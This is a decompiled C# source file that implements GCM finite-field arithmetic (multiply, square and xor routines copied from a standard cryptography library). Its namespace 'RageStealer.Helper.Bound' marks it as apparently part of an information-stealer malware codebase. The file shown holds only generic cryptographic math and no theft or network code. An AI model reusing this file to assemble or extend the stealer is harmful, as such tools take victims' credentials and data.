namespace RageStealer.Helper.Bound;

internal abstract class GcmUtilities
{
	private const uint E1 = 3774873600u;

	private const ulong E1UL = 16212958658533785600uL;

	internal static ulong[] OneAsUlongs()
	{
		return new ulong[2] { 9223372036854775808uL, 0uL };
	}

	internal static void AsBytes(ulong[] x, byte[] z)
	{
		Pack.UInt64_To_BE(x, z, 0);
	}

	internal static ulong[] AsUlongs(byte[] x)
	{
		ulong[] array = new ulong[2];
		Pack.BE_To_UInt64(x, 0, array);
		return array;
	}

	internal static void AsUlongs(byte[] x, ulong[] z, int zOff)
	{
		Pack.BE_To_UInt64(x, 0, z, zOff, 2);
	}

	internal static void DivideP(ulong[] x, int xOff, ulong[] z, int zOff)
	{
		ulong num = x[xOff];
		ulong num2 = x[xOff + 1];
		ulong num3 = (ulong)((long)num >> 63);
		num ^= num3 & 0xE100000000000000uL;
		z[zOff] = (num << 1) | (num2 >> 63);
		z[zOff + 1] = (num2 << 1) | (0L - num3);
	}

	internal static void Multiply(byte[] x, byte[] y)
	{
		ulong[] x2 = AsUlongs(x);
		ulong[] y2 = AsUlongs(y);
		Multiply(x2, y2);
		AsBytes(x2, x);
	}

	internal static void Multiply(ulong[] x, ulong[] y)
	{
		ulong num = x[0];
		ulong num2 = x[1];
		ulong num3 = y[0];
		ulong num4 = y[1];
		ulong num5 = Longs.Reverse(num);
		ulong num6 = Longs.Reverse(num2);
		ulong num7 = Longs.Reverse(num3);
		ulong num8 = Longs.Reverse(num4);
		ulong num9 = Longs.Reverse(ImplMul64(num5, num7));
		ulong num10 = ImplMul64(num, num3) << 1;
		ulong num11 = Longs.Reverse(ImplMul64(num6, num8));
		ulong num12 = ImplMul64(num2, num4) << 1;
		ulong num13 = Longs.Reverse(ImplMul64(num5 ^ num6, num7 ^ num8));
		ulong num14 = ImplMul64(num ^ num2, num3 ^ num4) << 1;
		ulong num15 = num9;
		ulong num16 = num10 ^ num9 ^ num11 ^ num13;
		ulong num17 = num11 ^ num10 ^ num12 ^ num14;
		ulong num18 = num12;
		num16 ^= num18 ^ (num18 >> 1) ^ (num18 >> 2) ^ (num18 >> 7);
		num17 ^= (num18 << 62) ^ (num18 << 57);
		num15 ^= num17 ^ (num17 >> 1) ^ (num17 >> 2) ^ (num17 >> 7);
		num16 ^= (num17 << 63) ^ (num17 << 62) ^ (num17 << 57);
		x[0] = num15;
		x[1] = num16;
	}

	internal static void MultiplyP7(ulong[] x, int xOff, ulong[] z, int zOff)
	{
		ulong num = x[xOff];
		ulong num2 = x[xOff + 1];
		ulong num3 = num2 << 57;
		z[zOff] = (num >> 7) ^ num3 ^ (num3 >> 1) ^ (num3 >> 2) ^ (num3 >> 7);
		z[zOff + 1] = (num2 >> 7) | (num << 57);
	}

	internal static void Square(ulong[] x, ulong[] z)
	{
		ulong[] array = new ulong[4];
		Interleave.Expand64To128Rev(x[0], array, 0);
		Interleave.Expand64To128Rev(x[1], array, 2);
		ulong num = array[0];
		ulong num2 = array[1];
		ulong num3 = array[2];
		ulong num4 = array[3];
		num2 ^= num4 ^ (num4 >> 1) ^ (num4 >> 2) ^ (num4 >> 7);
		num3 ^= (num4 << 62) ^ (num4 << 57);
		num ^= num3 ^ (num3 >> 1) ^ (num3 >> 2) ^ (num3 >> 7);
		num2 ^= (num3 << 63) ^ (num3 << 62) ^ (num3 << 57);
		z[0] = num;
		z[1] = num2;
	}

	internal static void Xor(byte[] x, byte[] y)
	{
		int num = 0;
		do
		{
			x[num] ^= y[num];
			num++;
			x[num] ^= y[num];
			num++;
			x[num] ^= y[num];
			num++;
			x[num] ^= y[num];
			num++;
		}
		while (num < 16);
	}

	internal static void Xor(byte[] x, byte[] y, int yOff)
	{
		int num = 0;
		do
		{
			x[num] ^= y[yOff + num];
			num++;
			x[num] ^= y[yOff + num];
			num++;
			x[num] ^= y[yOff + num];
			num++;
			x[num] ^= y[yOff + num];
			num++;
		}
		while (num < 16);
	}

	internal static void Xor(byte[] x, int xOff, byte[] y, int yOff, byte[] z, int zOff)
	{
		int num = 0;
		do
		{
			z[zOff + num] = (byte)(x[xOff + num] ^ y[yOff + num]);
			num++;
			z[zOff + num] = (byte)(x[xOff + num] ^ y[yOff + num]);
			num++;
			z[zOff + num] = (byte)(x[xOff + num] ^ y[yOff + num]);
			num++;
			z[zOff + num] = (byte)(x[xOff + num] ^ y[yOff + num]);
			num++;
		}
		while (num < 16);
	}

	internal static void Xor(byte[] x, byte[] y, int yOff, int yLen)
	{
		while (--yLen >= 0)
		{
			x[yLen] ^= y[yOff + yLen];
		}
	}

	internal static void Xor(byte[] x, int xOff, byte[] y, int yOff, int len)
	{
		while (--len >= 0)
		{
			x[xOff + len] ^= y[yOff + len];
		}
	}

	internal static void Xor(ulong[] x, int xOff, ulong[] y, int yOff, ulong[] z, int zOff)
	{
		z[zOff] = x[xOff] ^ y[yOff];
		z[zOff + 1] = x[xOff + 1] ^ y[yOff + 1];
	}

	private static ulong ImplMul64(ulong x, ulong y)
	{
		ulong num = x & 0x1111111111111111L;
		ulong num2 = x & 0x2222222222222222uL;
		ulong num3 = x & 0x4444444444444444uL;
		ulong num4 = x & 0x8888888888888888uL;
		ulong num5 = y & 0x1111111111111111uL;
		ulong num6 = y & 0x2222222222222222uL;
		ulong num7 = y & 0x4444444444444444uL;
		ulong num8 = y & 0x8888888888888888uL;
		ulong num9 = (num * num5) ^ (num2 * num8) ^ (num3 * num7) ^ (num4 * num6);
		ulong num10 = (num * num6) ^ (num2 * num5) ^ (num3 * num8) ^ (num4 * num7);
		ulong num11 = (num * num7) ^ (num2 * num6) ^ (num3 * num5) ^ (num4 * num8);
		ulong num12 = (num * num8) ^ (num2 * num7) ^ (num3 * num6) ^ (num4 * num5);
		num9 &= 0x1111111111111111uL;
		num10 &= 0x2222222222222222uL;
		num11 &= 0x4444444444444444uL;
		num12 &= 0x8888888888888888uL;
		return num9 | num10 | num11 | num12;
	}
}
